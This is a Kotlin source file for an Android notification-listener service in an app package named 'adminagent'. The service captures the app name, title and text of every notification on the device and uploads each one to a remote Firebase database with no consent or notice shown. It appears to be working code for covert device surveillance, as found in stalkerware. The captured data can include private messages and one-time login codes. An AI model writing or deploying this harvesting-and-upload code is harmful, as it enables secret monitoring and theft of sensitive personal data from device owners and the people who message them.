// File: NotificationListener.kt
package com.unify.adminagent

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.google.firebase.database.FirebaseDatabase

class NotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn?.let {
            val packageName = it.packageName
            val title = it.notification?.extras?.getString(android.app.Notification.EXTRA_TITLE) ?: "No Title"
            val text = it.notification?.extras?.getString(android.app.Notification.EXTRA_TEXT) ?: "No Text"
            val data = mapOf(
                "package" to packageName,
                "title" to title,
                "text" to text,
                "timestamp" to System.currentTimeMillis()
            )
            FirebaseDatabase.getInstance().getReference("admin/notifications").push().setValue(data)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}